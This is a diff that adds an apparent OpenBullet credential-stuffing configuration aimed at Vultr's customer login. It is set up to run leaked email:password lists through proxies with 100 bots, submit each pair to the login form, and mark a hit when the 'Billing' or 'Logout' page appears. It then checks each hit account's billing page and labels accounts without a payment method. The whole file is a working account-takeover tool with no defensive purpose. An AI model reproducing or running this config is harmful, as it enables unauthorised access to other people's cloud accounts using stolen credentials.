@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "VULTER.COM",
+  "SuggestedBots": 100,
+  "LastModified": "2019-07-23T22:18:44.3478659+00:00",
+  "AdditionalInfo": "",
+  "Author": "MAT REX",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://my.vultr.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "name=\"action\" value=\"" "\">" -> VAR "action" 
+REQUEST POST "https://my.vultr.com/" 
+  CONTENT "action=<action>&login_type=normal&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3             origin: https://my.vultr.com" 
+  HEADER "referer: https://my.vultr.com/" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username/password" 
+  KEYCHAIN Success OR 
+    KEY "Billing" 
+    KEY "Logout" 
+REQUEST GET "https://my.vultr.com/billing/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "please link a payment method to get started!" 
+FUNCTION Constant "CONFIG_BY_MAT_REX" -> CAP "VULTER" 
